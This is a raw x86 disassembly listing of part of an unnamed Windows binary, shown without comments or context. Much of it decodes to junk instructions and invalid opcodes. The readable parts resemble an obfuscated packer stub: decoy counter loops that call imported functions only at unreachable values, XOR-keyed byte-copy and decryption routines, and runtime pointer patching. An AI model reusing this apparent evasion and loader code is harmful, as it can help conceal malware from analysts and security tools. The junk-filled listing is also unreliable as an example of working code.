  403262:	jmp    0x403216
  403267:	or     DWORD PTR ds:0x427d0b,ecx
  40326d:	mov    edi,0xffcd8d62
  403272:	sub    edi,eax
  403274:	add    edi,DWORD PTR [ebp+0x10]
  403277:	or     DWORD PTR ds:0x427d07,0x4292a9
  403281:	xor    edx,ecx
  403283:	jmp    0x403385
  403288:	mov    DWORD PTR [edx-0x34],edi
  40328b:	dec    ebp
  40328c:	jecxz  0x4032fb
  40328e:	popf   
  40328f:	jp     0x40324f
  403291:	sahf   
  403292:	js     0x4032bc
  403294:	repnz pop edi
  403296:	jno    0x4032d5
  403298:	push   es
  403299:	add    edi,DWORD PTR [esp+edi*2+0x53]
  40329d:	jl     0x40331b
  40329f:	jl     0x4032d7
  4032a1:	jne    0x4032b9
  4032a3:	mov    esp,0x2a041b8f
  4032a8:	mov    edi,0x9e18196a
  4032ad:	mov    esi,DWORD PTR gs:[esi+0x568f8279]
  4032b4:	loope  0x4032a2
  4032b6:	aam    0x97
  4032b8:	mov    ah,0x26
  4032ba:	cmc    
  4032bb:	enter  0x5f89,0x41
  4032bf:	xchg   esi,eax
  4032c0:	xor    ebx,DWORD PTR [eax]
  4032c2:	vmread DWORD PTR [esi+0x3ced372c],ebx
  4032c9:	add    eax,0x4f10fe1
  4032ce:	nop
  4032cf:	push   ss
  4032d0:	push   0xffffff9c
  4032d2:	push   cs
  4032d3:	jl     0x4032dd
  4032d5:	popa   
  4032d6:	fsub   st,st(5)
  4032d8:	lahf   
  4032d9:	pop    ebp
  4032da:	lahf   
  4032db:	and    al,0xa
  4032dd:	lods   al,BYTE PTR ds:[esi]
  4032de:	inc    edi
  4032df:	xlat   BYTE PTR ss:[ebx]
  4032e1:	xlat   BYTE PTR ds:[ebx]
  4032e2:	push   edx
  4032e3:	push   eax
  4032e4:	xchg   edx,eax
  4032e5:	and    bl,BYTE PTR [ecx+0x1c]
  4032e8:	pop    ecx
  4032e9:	mov    al,0xc8
  4032eb:	popa   
  4032ec:	shl    DWORD PTR [edi],cl
  4032ee:	pushf  
  4032ef:	push   ss
  4032f0:	pushf  
  4032f1:	std    
  4032f2:	les    esi,FWORD PTR [eax+0x61039267]
  4032f8:	dec    edi
  4032f9:	lahf   
  4032fa:	cmp    BYTE PTR ds:0xc406adbd,dl
  403300:	das    
  403301:	push   ds
  403302:	fsubr  DWORD PTR ss:[ebx]
  403305:	pop    edx
  403306:	mov    ds:0x343b7dd9,eax
  40330b:	add    eax,0xc391cc2b
  403310:	push   esp
  403311:	repz sbb eax,0x7cf77cc7
  403317:	push   edi
  403318:	fdiv   QWORD PTR [esi]
  40331a:	in     al,0xb6
  40331c:	push   ss
  40331d:	sub    BYTE PTR [ebx+0x124e671b],0x53
  403324:	loopne 0x403333
  403326:	test   DWORD PTR [eax+esi*2+0xb122db3],eax
  40332d:	xlat   BYTE PTR ds:[ebx]
  40332e:	and    al,0x29
  403330:	lock push esp
  403332:	xor    eax,0x42ce4f38
  403337:	repnz dec eax
  403339:	stos   DWORD PTR es:[edi],eax
  40333a:	xchg   esp,eax
  40333b:	push   ss
  40333c:	lock push ecx
  40333e:	mov    bl,0xc5
  403340:	sar    ch,cl
  403342:	jecxz  0x403348
  403344:	daa    
  403345:	sub    al,dh
  403347:	leave  
  403348:	aam    0x12
  40334a:	lahf   
  40334b:	ret    
  40334c:	add    BYTE PTR ds:0x438b108d,ch
  403352:	(bad)  
  403353:	pop    es
  403354:	dec    ebp
  403355:	mov    ds:0x90f52c00,eax
  40335a:	dec    edi
  40335b:	div    DWORD PTR [ebx-0x637bec19]
  403361:	test   al,0x95
  403363:	inc    ebp
  403364:	cdq    
  403365:	jae    0x40331d
  403367:	fmul   QWORD PTR [eax]
  403369:	push   ebp
  40336a:	xor    edi,edi
  40336c:	adc    ebp,ebp
  40336e:	mov    gs:0xe502e25a,al
  403374:	sbb    eax,0xdf4c1611
  403379:	leave  
  40337a:	xchg   edx,eax
  40337b:	in     al,0x3d
  40337d:	mov    ch,0xd4
  40337f:	inc    BYTE PTR ds:0xb8057c74
  403385:	add    edx,esi
  403387:	cmp    edx,edi
  403389:	mov    DWORD PTR ds:0x4292b5,0x6344
  403393:	ja     0x4034eb
  403399:	push   ebx
  40339a:	jmp    0x4033a4
  40339f:	mov    esi,0x32729e
  4033a4:	mov    eax,DWORD PTR [ebp-0x8]
  4033a7:	mov    edi,DWORD PTR [ebp-0x4]
  4033aa:	xor    edi,ecx
  4033ac:	add    edi,esi
  4033ae:	mov    esi,DWORD PTR [ebp+0x8]
  4033b1:	imul   edi,edx
  4033b4:	mov    ebx,DWORD PTR [ebp+0xc]
  4033b7:	xor    eax,ecx
  4033b9:	add    eax,edx
  4033bb:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  4033c2:	mov    BYTE PTR [edi+esi*1],al
  4033c5:	mov    eax,DWORD PTR [ebp-0x4]
  4033c8:	xor    eax,ecx
  4033ca:	lea    edx,[edx+eax*1+0x32729e]
  4033d1:	mov    eax,DWORD PTR [ebp-0x4]
  4033d4:	jmp    0x4034d6
  4033d9:	jnp    0x4033fa
  4033db:	dec    BYTE PTR [eax-0x108252a6]
  4033e1:	pop    esi
  4033e2:	mov    DWORD PTR [edx],ebp
  4033e4:	pop    ebp
  4033e5:	mov    WORD PTR [edi+0x37d1ae6],fs
  4033eb:	jl     0x403469
  4033ed:	push   ebx
  4033ee:	jl     0x40346c
  4033f0:	jl     0x4033ad
  4033f2:	sub    dh,al
  4033f4:	sti    
  4033f5:	aas    
  4033f6:	or     al,0xe2
  4033f8:	inc    ebp
  4033f9:	lea    edx,[esi-0xdc0042c]
  4033ff:	xchg   ebx,eax
  403400:	push   eax
  403401:	cli    
  403402:	ficomp WORD PTR [esi+0x1419c62]
  403408:	add    al,0xc4
  40340a:	or     eax,0xcbc4d110
  40340f:	add    dl,al
  403411:	imul   esp,ecx,0xf16ca64a
  403417:	pop    ebx
  403418:	cli    
  403419:	jae    0x403412
  40341b:	aas    
  40341c:	mov    dl,BYTE PTR [eax+0x25]
  40341f:	add    eax,0x5e1a1132
  403424:	adc    ebp,DWORD PTR [ecx+0xaef907e]
  40342a:	inc    esi
  40342b:	in     al,0xea
  40342d:	or     ah,BYTE PTR ds:0x2304d9b8
  403433:	sar    BYTE PTR [ebx],0x37
  403436:	mov    eax,0xec1f0461
  40343b:	icebp  
  40343c:	pop    esi
  40343d:	xchg   BYTE PTR [esi-0x16cb1deb],al
  403443:	xchg   ebp,eax
  403444:	push   es
  403445:	retf   0x97c2
  403448:	xlat   BYTE PTR ds:[ebx]
  403449:	nop
  40344a:	lahf   
  40344b:	push   ds
  40344c:	sub    eax,0x724f86f9
  403451:	xchg   edx,eax
  403452:	nop
  403453:	je     0x4033d7
  403455:	jne    0x4034bb
  403457:	sub    DWORD PTR [ecx],edx
  403459:	clc    
  40345a:	or     eax,0x3162f82f
  40345f:	sbb    ch,BYTE PTR [ecx*8+0x3ddbab2d]
  403466:	mov    edi,0x25491469
  40346b:	call   FWORD PTR ds:[edx-0x3ec9e23b]
  403472:	jge    0x40340d
  403474:	sub    eax,0x6a199de5
  403479:	rol    ch,0x7f
  40347c:	scas   eax,DWORD PTR es:[edi]
  40347d:	ins    DWORD PTR es:[edi],dx
  40347e:	std    
  40347f:	inc    eax
  403480:	push   0x972b6bbb
  403485:	scas   eax,DWORD PTR es:[edi]
  403486:	cwde   
  403487:	clc    
  403488:	pop    ss
  403489:	mov    eax,ds:0xe336cc79
  40348e:	loope  0x4034fe
  403490:	test   BYTE PTR [edx-0x6c],bh
  403493:	mov    eax,0x1a3efe15
  403498:	fisub  DWORD PTR [edi+eiz*1+0x1a]
  40349c:	add    edi,DWORD PTR [esi+0x72]
  40349f:	add    edi,edi
  4034a1:	arpl   WORD PTR [esi+0x614c826d],di
  4034a7:	mov    ah,0xcc
  4034a9:	push   ebx
  4034aa:	mov    eax,0xaa2ef949
  4034af:	ds push edi
  4034b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b2:	jle    0x403531
  4034b4:	pop    es
  4034b5:	test   eax,0xf5a3e7
  4034ba:	pop    esi
  4034bb:	xor    BYTE PTR [ebx+0x5cbe8b3f],dh
  4034c1:	outs   dx,DWORD PTR ds:[esi]
  4034c2:	dec    eax
  4034c3:	into   
  4034c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c5:	fwait
  4034c6:	inc    edx
  4034c7:	ins    DWORD PTR es:[edi],dx
  4034c8:	je     0x403486
  4034ca:	xchg   ebx,eax
  4034cb:	test   BYTE PTR [esi-0x7e],al
  4034ce:	js     0x40351a
  4034d0:	inc    eax
  4034d1:	popa   
  4034d2:	iret   
  4034d3:	inc    esi
  4034d4:	sub    eax,0xbec133c0
  4034d9:	bound  ecx,QWORD PTR [ebp-0xfd40033]
  4034df:	add    esi,DWORD PTR [ebp+0x10]
  4034e2:	cmp    edx,esi
  4034e4:	jbe    0x40339f
  4034ea:	pop    ebx
  4034eb:	mov    eax,0xf89c8534
  4034f0:	pop    edi
  4034f1:	pop    esi
  4034f2:	leave  
  4034f3:	ret    0xc
  4034f6:	push   ebp
  4034f7:	mov    ebp,esp
  4034f9:	mov    eax,ds:0x409224
  4034fe:	movzx  ecx,BYTE PTR ds:0x4292c1
  403505:	add    DWORD PTR ds:0x4275ac,ecx
  40350b:	mov    edx,0x32729e
  403510:	mov    DWORD PTR ds:0x4292d9,0x1e
  40351a:	cmp    DWORD PTR ds:0x4292d9,0x0
  403521:	je     0x4035b5
  403527:	cmp    DWORD PTR ds:0x4292d9,0x27
  40352e:	jne    0x40353f
  403534:	push   0x1072
  403539:	call   DWORD PTR ds:0x427c43
  40353f:	mov    ecx,DWORD PTR ds:0x4292d9
  403545:	dec    ecx
  403546:	mov    DWORD PTR ds:0x4292d9,ecx
  40354c:	jmp    0x40351a
  403551:	and    DWORD PTR ds:0x4292c5,0x0
  40355b:	xor    ecx,ecx
  40355d:	or     ecx,DWORD PTR ds:0x4292c5
  403563:	inc    ecx
  403564:	mov    DWORD PTR ds:0x4292c5,ecx
  40356a:	cmp    DWORD PTR ds:0x4292c5,0xd
  403571:	jne    0x40358c
  403577:	push   0x42c892
  40357c:	push   0x4275ed
  403581:	push   0x400000
  403586:	call   DWORD PTR ds:0x427a93
  40358c:	cmp    DWORD PTR ds:0x4292c5,0xc
  403593:	jne    0x4035a8
  403599:	xor    ecx,ecx
  40359b:	or     ecx,DWORD PTR ds:0x4292c5
  4035a1:	inc    ecx
  4035a2:	mov    DWORD PTR ds:0x4292c5,ecx
  4035a8:	cmp    DWORD PTR ds:0x4292c5,0x17
  4035af:	jb     0x40355b
  4035b5:	sub    eax,edx
  4035b7:	mov    ecx,DWORD PTR ds:0x42c8ae
  4035bd:	mov    ecx,DWORD PTR [ecx]
  4035bf:	sbb    DWORD PTR ds:0x4275b0,ecx
  4035c5:	mov    ecx,0x7510857
  4035ca:	push   esi
  4035cb:	mov    esi,DWORD PTR [ebp+0xc]
  4035ce:	xor    eax,ecx
  4035d0:	cmp    eax,esi
  4035d2:	je     0x403916
  4035d8:	mov    eax,ds:0x40921c
  4035dd:	mov    esi,DWORD PTR [ebp+0xc]
  4035e0:	sub    eax,edx
  4035e2:	jmp    0x4036e1
  4035e7:	not    DWORD PTR [ebx-0x6c]
  4035ea:	adc    ch,BYTE PTR [eax-0x13]
  4035ed:	lea    ebp,[ebp+0x4f]
  4035f0:	xchg   edi,eax
  4035f1:	xchg   esp,eax
  4035f2:	cwde   
  4035f3:	push   ebp
  4035f4:	dec    ebp
  4035f5:	out    dx,eax
  4035f6:	sahf   
  4035f7:	push   eax
  4035f8:	add    bh,BYTE PTR [esp+edi*2+0x5e]
  4035fc:	jl     0x40367a
  4035fe:	jl     0x403622
  403600:	jl     0x403602
  403602:	ins    BYTE PTR es:[edi],dx
  403603:	(bad)  
  403604:	shl    DWORD PTR ds:0xded26a6,1
  40360a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40360b:	icebp  
  40360c:	loope  0x4035f5
  40360e:	jmp    0x50052b3
  403613:	arpl   cx,bp
  403615:	mov    bl,0xa2
  403617:	jno    0x4035de
  403619:	and    ecx,DWORD PTR [ebp-0x51]
  40361c:	or     DWORD PTR [ebx-0x16],0xffffffcc
  403620:	pushf  
  403621:	adc    al,bl
  403623:	push   ds
  403624:	or     BYTE PTR [edx-0x3b31dddb],dh
  40362a:	xchg   ecx,edx
  40362c:	sbb    DWORD PTR [ecx+0x2c],ecx
  40362f:	js     0x40368c
  403631:	xor    DWORD PTR [ebp-0x25ff5dec],esp
  403637:	loop   0x40369e
  403639:	leave  
  40363a:	sbb    ecx,DWORD PTR [edi*2-0x7292229e]
  403641:	aad    0xad
  403643:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403645:	hlt    
  403646:	(bad)
  403649:	pop    ebp
  40364a:	mov    esp,0x41c8c4b3
  40364f:	pop    edx
  403650:	xchg   ebp,eax
  403651:	and    al,0x51
  403653:	ret    
  403654:	adc    al,0xdf
  403656:	rcl    edx,0x69
  403659:	mov    ecx,0x14d3e666
  40365e:	xchg   edx,eax
  40365f:	test   BYTE PTR [esi],ah
  403661:	lahf   
  403662:	retf   0x45f1
  403665:	or     al,al
  403667:	test   esi,ebp
  403669:	inc    eax
  40366a:	and    al,0xcb
  40366c:	jmp    ebx
  40366e:	mov    cs,WORD PTR [eax]
  403670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403671:	pop    ebp
  403672:	test   cl,dl
  403674:	jp     0x403676
  403676:	push   edi
  403677:	push   0x658c766a
  40367c:	imul   edx,DWORD PTR [esi-0xe],0xfffffffb
  403680:	push   edx
  403681:	sbb    ecx,edx
  403683:	mov    dh,0xa6
  403685:	mov    esi,0xec48de3b
  40368a:	inc    esi
  40368b:	pop    eax
  40368c:	add    DWORD PTR [edi+0x74],eax
  40368f:	int    0xf8
  403691:	push   eax
  403692:	ins    BYTE PTR es:[edi],dx
  403693:	push   edi
  403694:	push   0x17
  403696:	jb     0x40366a
  403698:	adc    ebp,DWORD PTR [ebp+0x43f44f22]
  40369e:	xchg   edx,eax
  40369f:	fnsave [ebp+0x3]
  4036a2:	aad    0x8
  4036a4:	call   0x2e0204f0
  4036a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036aa:	cld    
  4036ab:	and    al,0xb3
  4036ad:	xor    DWORD PTR [esi+0x3],esp
  4036b0:	mul    BYTE PTR [ebx+0x37481de9]
  4036b6:	scas   eax,DWORD PTR es:[edi]
  4036b7:	or     bl,bh
  4036b9:	out    dx,al
  4036ba:	mov    esi,0x3e9b182c
  4036bf:	repz enter 0x7809,0x7a
  4036c4:	js     0x403674
  4036c6:	js     0x403719
  4036c8:	push   ebx
  4036c9:	ins    BYTE PTR es:[edi],dx
  4036ca:	in     al,dx
  4036cb:	jbe    0x403675
  4036cd:	mov    al,ah
  4036cf:	push   edx
  4036d0:	in     eax,0x4
  4036d2:	jae    0x40374b
  4036d4:	pusha  
  4036d5:	test   DWORD PTR [edi],0xbee67009
  4036db:	mov    eax,ds:0x228675b2
  4036e0:	dec    ecx
  4036e1:	xor    eax,ecx
  4036e3:	cmp    eax,esi
  4036e5:	jne    0x4037fa
  4036eb:	mov    eax,ds:0x409224
  4036f0:	add    eax,DWORD PTR ds:0x40921c
  4036f6:	jmp    0x403900
  4036fb:	jmp    0x4037fa
  403700:	xchg   esi,eax
  403701:	xchg   ebx,eax
  403702:	pop    ecx
  403703:	test   BYTE PTR [ebp+0x7a],bl
  403706:	imul   esp,DWORD PTR [ebp-0x47e923f9],0xb98c477f
  403710:	mov    dl,0x5
  403712:	jl     0x403790
  403714:	pop    esi
  403715:	jl     0x403793
  403717:	jl     0x403708
  403719:	jmp    0xfcbce323
  40371e:	push   ebx
  40371f:	xor    ebp,DWORD PTR [esi-0x4b6704fb]
  403725:	rol    BYTE PTR [esi+esi*8+0x51],cl
  403729:	out    dx,al
  40372a:	fdivr  st,st(0)
  40372c:	cmp    al,0x18
  40372e:	xchg   ebx,eax
  40372f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403730:	adc    al,0x79
  403732:	cmp    BYTE PTR [edi],bl
  403734:	js     0x403739
  403736:	xchg   BYTE PTR [edi-0x4f441c5f],bl
  40373c:	mov    BYTE PTR [ebp+ebx*1-0x47619eca],al
  403743:	(bad)  
  403744:	push   ss
  403745:	loop   0x403765
  403747:	pop    ecx
  403748:	inc    ecx
  403749:	int3   
  40374a:	nop
  40374b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40374c:	inc    esi
  40374d:	add    al,0xcb
  40374f:	jle    0x4037a6
  403751:	add    DWORD PTR [eax+ebp*1],ecx
  403754:	das    
  403755:	or     BYTE PTR ds:0x798ff578,0x19
  40375c:	data16 jb 0x403772
  40375f:	adc    DWORD PTR [edi+0x6b],edx
  403762:	retf   
  403763:	out    0x76,eax
  403765:	sub    eax,0x7617b301
  40376a:	lods   eax,DWORD PTR ds:[esi]
  40376b:	pop    edi
  40376c:	enter  0xff29,0x8
  403770:	lock call 0xf6b6:0x64db3b16
  403778:	cmc    
  403779:	cmp    al,0xda
  40377b:	data16 jmp 0x4037a0
  40377e:	aaa    
  40377f:	dec    esp
  403780:	mov    edi,0xa8925a9f
  403785:	add    edx,DWORD PTR [esi-0x58925fd1]
  40378b:	outs   dx,DWORD PTR ds:[esi]
  40378c:	sti    
  40378d:	dec    eax
  40378e:	aad    0x33
  403790:	mov    dl,0x60
  403792:	cdq    
  403793:	xor    BYTE PTR gs:[eax-0x45],al
  403797:	das    
  403798:	js     0x40377d
  40379a:	outs   dx,BYTE PTR ds:[esi]
  40379b:	fistp  QWORD PTR [edi-0x291c9a7e]
  4037a1:	je     0x4037aa
  4037a3:	inc    esi
  4037a4:	mov    WORD PTR [edx],?
  4037a6:	sub    cl,BYTE PTR [edi]
  4037a8:	jl     0x40375f
  4037aa:	push   edi
  4037ab:	out    dx,eax
  4037ac:	xchg   ecx,eax
  4037ad:	scas   al,BYTE PTR es:[edi]
  4037ae:	xchg   edx,eax
  4037af:	xor    al,0xd6
  4037b1:	das    
  4037b2:	and    al,0x6e
  4037b4:	ret    0xbc0a
  4037b7:	and    al,0x6e
  4037b9:	pop    eax
  4037ba:	push   edx
  4037bb:	ret    0x11b9
  4037be:	iret   
  4037bf:	sub    al,BYTE PTR [edx]
  4037c1:	daa    
  4037c2:	sub    al,0x9d
  4037c4:	xor    BYTE PTR [ebx],0x11
  4037c7:	inc    edi
  4037c8:	jl     0x403770
  4037ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037cb:	int    0x7e
  4037cd:	aad    0x27
  4037cf:	mov    cs,WORD PTR [eax-0x43]
  4037d2:	lds    esi,FWORD PTR [eax]
  4037d4:	add    DWORD PTR [edx-0x42],edi
  4037d7:	leave  
  4037d8:	retf   0x9aec
  4037db:	rcr    ch,0x57
  4037de:	and    al,0xec
  4037e0:	mov    WORD PTR [edx-0x72],ds
  4037e3:	jecxz  0x403830
  4037e5:	lahf   
  4037e6:	inc    esp
  4037e7:	dec    ecx
  4037e8:	adc    ebx,DWORD PTR [esi+0x3a]
  4037eb:	jmp    0x7d1eb632
  4037f0:	push   ebp
  4037f1:	or     DWORD PTR [esi-0x347a6125],0xffffffa7
  4037f8:	mov    ds:0xc458b0e,al
  4037fd:	jmp    0x4038fc
  403802:	add    al,0x38
  403804:	and    DWORD PTR [ebx-0x5b],0x27bfa7d
  40380b:	jg     0x40385f
  40380d:	and    BYTE PTR [edi],dl
  40380f:	xlat   BYTE PTR ds:[ebx]
  403810:	leave  
  403811:	aas    
  403812:	xchg   esp,eax
  403813:	add    al,0x7c
  403815:	jl     0x403875
  403817:	jl     0x403895
  403819:	jl     0x403829
  40381b:	jbe    0x403828
  40381d:	push   0x7b
  40381f:	inc    esi
  403820:	jl     0x403875
  403822:	mov    dl,BYTE PTR ds:0x4e8df0ed
  403828:	imul   edi,edx,0x816dfb73
  40382e:	test   eax,0x1c321930
  403833:	ror    DWORD PTR [edi-0x6d],cl
  403836:	addr16 jns 0x4038a3
  403839:	sub    esi,DWORD PTR [ebx-0x60c96385]
  40383f:	or     dl,bh
  403841:	div    DWORD PTR [ebx+0x58]
  403844:	dec    esp
  403845:	pop    ecx
  403846:	mov    BYTE PTR [eax+0x2b],dl
  403849:	test   DWORD PTR [edi+0x79],edx
  40384c:	rcl    DWORD PTR [edi-0x4e],1
  40384f:	gs pop eax
  403851:	xchg   esi,eax
  403852:	aam    0x4c
  403854:	mov    WORD PTR [edx-0x5b],?
  403857:	cmp    al,0xe5
  403859:	cmp    ebp,esi
  40385b:	jno    0x403801
  40385d:	jbe    0x40381b
  40385f:	stc    
  403860:	xchg   ebp,eax
  403861:	cmp    cl,ch
  403863:	mov    dl,0x8d
  403865:	xchg   edi,eax
  403866:	add    eax,0xa33ec1b8
  40386b:	popf   
  40386c:	pop    ds
  40386d:	test   DWORD PTR [eax],edi
  40386f:	fcmovnbe st,st(3)
  403871:	pop    es
  403872:	push   ebx
  403873:	jmp    0xac8387e2
  403878:	jo     0x403858
  40387a:	inc    eax
  40387b:	stos   BYTE PTR es:[edi],al
  40387c:	aas    
  40387d:	fcom   st(3)
  40387f:	and    eax,0x37b776ac
  403884:	sub    al,0x29
  403886:	leave  
  403887:	cmp    esi,ecx
  403889:	fist   WORD PTR [ebx-0x73445f51]
  40388f:	sub    BYTE PTR [ecx+0x5d],dl
  403892:	inc    edi
  403893:	(bad)  
  403894:	mov    esi,0x6753c49e
  403899:	out    dx,al
  40389a:	mov    esp,0x1d51684e
  40389f:	jne    0x403885
  4038a1:	stos   DWORD PTR es:[edi],eax
  4038a2:	add    DWORD PTR [edx],0xffffffa1
  4038a5:	out    dx,al
  4038a6:	shl    DWORD PTR [edx],1
  4038a8:	mov    ch,0x81
  4038aa:	push   ds
  4038ab:	inc    ecx
  4038ac:	jb     0x40387e
  4038ae:	ficom  WORD PTR [esi+0x1573f2d9]
  4038b4:	outs   dx,DWORD PTR ds:[esi]
  4038b5:	dec    edx
  4038b6:	cs pop ss
  4038b8:	jmp    0xaaa1a8f3
  4038bd:	jg     0x4038c0
  4038bf:	jmp    0xd64:0x75ccbfb6
  4038c6:	adc    edx,ecx
  4038c8:	sub    DWORD PTR [edx+0x5fda4c1e],ebx
  4038ce:	pop    ebx
  4038cf:	mov    ebx,0xe20d4a30
  4038d4:	xor    ch,al
  4038d6:	push   ecx
  4038d7:	mov    ds:0xa387e5e6,eax
  4038dc:	shl    BYTE PTR [eax-0x5adbdcfa],1
  4038e2:	cwde   
  4038e3:	das    
  4038e4:	(bad)  
  4038e5:	jb     0x40393e
  4038e7:	imul   esp,DWORD PTR [esi+0x1b],0x7dc0098f
  4038ee:	jl     0x4038bf
  4038f0:	aad    0x3b
  4038f2:	mov    ch,bh
  4038f4:	xor    ch,BYTE PTR [eax+edi*2+0x7d]
  4038f8:	mov    ah,0xcd
  4038fa:	jb     0x403950
  4038fc:	xor    eax,ecx
  4038fe:	add    eax,edx
  403900:	mov    ds:0x40921c,eax
  403905:	mov    eax,DWORD PTR [ebp+0xc]
  403908:	xor    eax,ecx
  40390a:	add    eax,edx
  40390c:	mov    ds:0x409224,eax
  403911:	jmp    0x403920
  403916:	mov    eax,ds:0x409224
  40391b:	mov    ds:0x40921c,eax
  403920:	mov    eax,DWORD PTR [ebp+0x8]
  403923:	mov    eax,DWORD PTR [eax]
  403925:	mov    ecx,DWORD PTR ds:0x40921c
  40392b:	add    DWORD PTR [eax],ecx
  40392d:	pop    esi
  40392e:	pop    ebp
  40392f:	ret    0x8
  403932:	push   ebp
  403933:	mov    ebp,esp
  403935:	sub    esp,0x58
  403938:	mov    DWORD PTR ds:0x42c89e,0x1c
  403942:	cmp    DWORD PTR ds:0x42c89e,0x0
  403949:	je     0x40397e
  40394f:	cmp    DWORD PTR ds:0x42c89e,0x22
  403956:	jne    0x40396b
  40395c:	push   DWORD PTR [ebp-0x14]
  40395f:	push   DWORD PTR [ebp-0x28]
  403962:	push   DWORD PTR [ebp-0x10]
  403965:	call   DWORD PTR ds:0x4278ef
  40396b:	xor    eax,eax
  40396d:	add    eax,DWORD PTR ds:0x42c89e
  403973:	dec    eax
  403974:	mov    ds:0x42c89e,eax
  403979:	jmp    0x403942
  40397e:	mov    ecx,DWORD PTR [ebp+0x8]
  403981:	mov    eax,0x8a42
  403986:	xor    ax,WORD PTR [ecx+0x20]
  40398a:	mov    ecx,0x3b08
  40398f:	add    ax,cx
  403992:	jmp    0x403a97
  403997:	sar    BYTE PTR [edi-0x226ae210],cl
  40399d:	jge    0x403a06
  40399f:	js     0x4039f2
  4039a1:	dec    edi
  4039a2:	mov    esi,0x9211acb1
  4039a7:	test   BYTE PTR [edi],0x7c
  4039aa:	jl     0x403a00
  4039ac:	jl     0x403a2a
  4039ae:	jl     0x403948
  4039b0:	popa   
  4039b1:	push   0xfffffff6
  4039b3:	dec    edi
  4039b4:	popf   
  4039b5:	mov    edi,0x51dac520
  4039ba:	les    ebp,FWORD PTR [edi]
  4039bc:	imul   eax,edi,0x24e029f2
  4039c2:	xor    ebx,ecx
  4039c4:	mov    eax,0xcad3b516
  4039c9:	addr16 int3 
  4039cb:	mov    eax,0x77fc108f
  4039d0:	mov    WORD PTR [eax+0x7414b29b],cs
  4039d6:	pop    ecx
  4039d7:	or     ebp,DWORD PTR [ebx+0x63205d10]
  4039dd:	imul   esi,DWORD PTR [ebx],0xc6d5ab1d
  4039e3:	jp     0x4039f3
  4039e5:	fdivr  st,st(3)
  4039e7:	jo     0x403a3d
  4039e9:	push   eax
  4039ea:	adc    al,0xed
  4039ec:	push   ss
  4039ed:	jmp    0x3133:0x46305b60
  4039f4:	inc    esi
  4039f5:	out    dx,al
  4039f6:	(bad)  
  4039f7:	ds xchg ebx,eax
  4039f9:	jbe    0x403a53
  4039fb:	push   eax
  4039fc:	add    DWORD PTR [edx+ebx*4],esp
  4039ff:	or     al,0xa8
  403a01:	repnz mov eax,0xe1153424
  403a07:	fst    DWORD PTR [ecx-0x5e]
  403a0a:	xchg   edx,eax
  403a0b:	loopne 0x4039ff
  403a0d:	repz mov ds:0x859d6f9a,al
  403a13:	jmp    0x403a46
  403a15:	mov    edi,0x51d1a308
  403a1a:	aas    
  403a1b:	lods   eax,DWORD PTR ds:[esi]
  403a1c:	pop    ecx
  403a1d:	cdq    
  403a1e:	loop   0x403a7f
  403a20:	pop    ecx
  403a21:	lock push si
  403a24:	dec    edi
  403a25:	xor    al,BYTE PTR [eax-0x20]
  403a28:	in     eax,0x4
  403a2a:	add    ch,BYTE PTR [esi-0x43ef9b6d]
  403a30:	or     dh,BYTE PTR [ebp-0x34]
  403a33:	ins    DWORD PTR es:[edi],dx
  403a34:	jmp    0xba14:0x6caebe82
  403a3b:	pop    edx
  403a3c:	jo     0x4039f5
  403a3e:	pop    ds
  403a3f:	sub    ecx,edi
  403a41:	lods   al,BYTE PTR ds:[esi]
  403a42:	xor    eax,0xedca40cc
  403a47:	mov    ds:0xb7ef8d83,al
  403a4c:	test   cl,cl
  403a4e:	jl     0x4039f7
  403a50:	frstor [ebp-0x4521cc2c]
  403a56:	(bad)  
  403a57:	push   ebp
  403a58:	jmp    0x403ac4
  403a5a:	aad    0x2f
  403a5c:	cld    
  403a5d:	add    ebp,ebp
  403a5f:	cs das 
  403a61:	pop    ebx
  403a62:	int    0xf3
  403a64:	imul   ecx
  403a66:	vmread DWORD PTR [esi-0x19f68c4b],eax
  403a6d:	ds mov dl,0xd5
  403a70:	sub    BYTE PTR [edi],0xf2
  403a73:	adc    eax,0x405bb914
  403a78:	mul    BYTE PTR [edx-0x55]
  403a7b:	rol    esp,cl
  403a7d:	mov    ebp,DWORD PTR [eax-0x24]
  403a80:	stos   BYTE PTR es:[edi],al
  403a81:	fld    QWORD PTR [eax+0x3c36eae7]
  403a87:	jne    0x403a74
  403a89:	inc    esp
  403a8a:	stos   DWORD PTR es:[edi],eax
  403a8b:	into   
  403a8c:	outs   dx,BYTE PTR ds:[esi]
  403a8d:	inc    esp
  403a8e:	mov    cl,0x2e
  403a90:	mov    dh,0xaf
  403a92:	xchg   edi,eax
  403a93:	sar    DWORD PTR [ebx-0x34],1
  403a96:	sahf   
  403a97:	movzx  eax,ax
  403a9a:	xor    ecx,ecx
  403a9c:	xor    ecx,DWORD PTR ds:0x427db0
  403aa2:	mov    ecx,DWORD PTR [ecx]
  403aa4:	or     DWORD PTR ds:0x42c88a,ecx
  403aaa:	mov    DWORD PTR [ebp-0xc],eax
  403aad:	adc    DWORD PTR ds:0x42c882,ecx
  403ab3:	mov    BYTE PTR [ebp-0x1],0x7f
  403ab7:	not    ecx
  403ab9:	lea    eax,[ebp-0x1]
  403abc:	xor    DWORD PTR ds:0x42c88a,0x4292b9
  403ac6:	mov    DWORD PTR [ebp-0x10],eax
  403ac9:	mov    DWORD PTR ds:0x427d0f,0x12
  403ad3:	cmp    DWORD PTR ds:0x427d0f,0x0
  403ada:	je     0x403b2a
  403ae0:	cmp    DWORD PTR ds:0x427d0f,0x8
  403ae7:	jne    0x403af6
  403aed:	push   DWORD PTR [ebp-0xc]
  403af0:	call   DWORD PTR ds:0x4279cf
  403af6:	cmp    DWORD PTR ds:0x427d0f,0x9
  403afd:	jne    0x403b12
  403b03:	xor    ecx,ecx
  403b05:	xor    ecx,DWORD PTR ds:0x427d0f
  403b0b:	dec    ecx
  403b0c:	mov    DWORD PTR ds:0x427d0f,ecx
  403b12:	mov    ecx,DWORD PTR ds:0x427d0f
  403b18:	dec    ecx
  403b19:	mov    DWORD PTR ds:0x427d0f,ecx
  403b1f:	jmp    0x403ad3
